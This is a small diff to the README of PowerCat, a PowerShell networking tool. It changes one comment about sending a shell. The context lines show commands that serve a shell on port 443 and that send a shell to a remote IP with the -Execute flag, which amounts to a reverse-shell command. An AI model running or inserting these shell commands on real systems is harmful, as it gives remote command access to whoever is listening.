@@ -72,7 +72,7 @@ PowerCat can be used to send and serve (Power)Shells using the -Execute paramete
     # Serve a shell:
     Start-PowerCat -Port 443 -Execute
         
-    # Send a cmd Shell:
+    # Send a Shell:
     Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -Execute
 ```
 UDP and SMB
